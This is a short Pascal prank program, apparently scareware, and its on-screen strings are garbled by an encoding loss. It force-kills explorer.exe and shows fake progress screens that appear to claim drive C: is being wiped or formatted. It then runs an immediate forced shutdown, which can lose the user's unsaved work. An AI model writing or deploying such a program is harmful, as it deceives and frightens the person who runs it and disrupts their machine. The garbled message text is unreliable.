program project1;
uses crt, dos;
var
  i, j:Integer;

begin
  randomize;
  writeln('�������� (',random(3)+2,'.',random(5)+2,' MB)');
  delay(2000);

  ClrScr;
  Exec('taskkill', '/IM explorer.exe /F');
  for i:=1 to 100 do
  begin
    j:=random(5);
      writeln('���������� ����� ������ - ',i,'%');
      write('��� ���������, ��� �������� ��� ���� ���������� ����� ��������');
      delay(random(150)+20);
      ClrScr;
    if (i=100) then begin
      write('�������������� ����� (C:) - ');
      delay(random(300)+300);
      write('������ ������');
      delay(1000);
      write('.');
      delay(1000);
      write('.');
      delay(1000);
      write('.');
      delay(3000);
      ClrScr;
    end;
  end;
  for i:=1 to 100 do
  begin
      writeln('�������������� ����� (C:) - ',i,'%');
      write('��� ���������, ��� �������� ��� ���� ���������� ����� ��������');
      delay(random(100)+10);
      if (j=1) then delay(250);
      ClrScr;
  end;

  Exec('shutdown', '-s -t 0')


end.

